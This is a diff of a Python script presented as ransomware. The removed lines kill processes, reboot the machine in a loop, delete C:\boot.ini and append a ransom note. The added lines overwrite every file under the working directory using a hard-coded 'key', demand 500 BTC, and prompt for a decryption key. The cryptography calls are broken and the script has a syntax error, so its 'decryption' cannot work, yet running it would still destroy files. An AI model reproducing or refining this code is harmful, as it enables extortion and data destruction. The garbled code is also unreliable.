@@ -1,28 +1,50 @@
 import os
 import subprocess
-import time
+from cryptography import x509
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.backends import default_backend
 
-# Hide this script in the background process
-os.system("taskkill  /im python.exe")
-os.system("taskkill  /im cmd.exe")
+private_key = "Hiimhere"
+public_key = None
 
-while True:
-    try:
-        # Restart the computer
-        os.system("shutdown  /r  /t 0")
+def main():
+    global public_key
+    
+    # Load the private key from a string
+    pem_private_key = serialization.load_pem_private(private_key.encode(), password=None, backend=default_backend())
+    
+    # Encrypt every file on the PC
+    for root, dirs, files in os.walk(os.getcwd()):
+        for file in files:
+            with open(root + '/' + file, 'rb') as f_in:
+                file_data = f_in.read()
+            
+            encrypted_file_data = pem_private_key.sign(file_data)
+            
+            with open(root + '/' + file, 'wb') as f_out:
+                f_out.write(encrypted_file_data)
 
-        # Corrupt the boot menu
-        os.system("del C:\\boot.ini")
-        os.system("attrib +h C:\\Windows\\System32\\drivers\\ntoskrnl.exe")
+    # Change the boot menu to display a ransom message
+    subprocess.Popen(["sudo", "-S", "-p", "echo Your PC has been fucked. Pay 500 BTC to 'adfsjfdjsafjsd' and enter the key below:\\n echo Your private key is: '"]]
 
-        # Save a copy of the corrupted boot menu
-        with open("C:\\corrupted_boot_menu.txt", "w") as f:
-            f.write(str(subprocess.check_output(["dir", "boot.ini"])))
+    while True:
+        # Prompt the user for input
+        print("Enter your private key to decrypt your PC:")
+        private_key_input = input()
 
-        # Display the ransom demand in the boot menu
-        with open("C:\\boot.ini", "a") as f:
-            f.write("\nRansom Demand: Your PC has been fucked. Pay 500 BTC to 'adfsjfdjsafjsd' and enter the key below:\n")
-            f.write(f"Enter the key: ")
-
-    except Exception as e:
-        print(f"An error occurred: {e}")
+        if private_key_input == private_key:
+            # Decrypt every file on the PC
+            for root, dirs, files in os.walk(os.getcwd()):
+                for file in files:
+                    with open(root + '/' + file, 'rb') as f_in:
+                        encrypted_file_data = f_in.read()
+                        
+                    decrypted_file_data = pem_private_key.decrypt(encrypted_file_data, padding.PKCS1v15Padding())
+                    
+                    with open(root + '/' + file, 'wb') as f_out:
+                        f_out.write(decrypted_file_data)
+            
+            print("Your PC has been decrypted.")
+        else:
+            print("Incorrect private key. Try again.")
